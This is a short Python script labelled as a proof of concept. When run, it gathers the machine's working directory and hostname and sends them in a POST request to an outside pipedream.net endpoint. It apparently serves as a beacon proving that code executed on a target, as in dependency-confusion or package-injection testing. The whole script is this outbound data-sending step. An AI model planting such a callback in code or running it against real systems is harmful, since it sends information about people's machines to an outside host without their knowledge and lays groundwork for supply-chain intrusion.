print("hello, This is POC")

import os
import socket
import json
import urllib.request


def send():
    data = {
        "cwd": os.getcwd(),
        "hostname": socket.gethostname(),
    }

    req = urllib.request.Request(
        "https://eo564o8onnct9jy.m.pipedream.net/post",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"}
    )

    response = urllib.request.urlopen(req)

    print(response.status)


send()
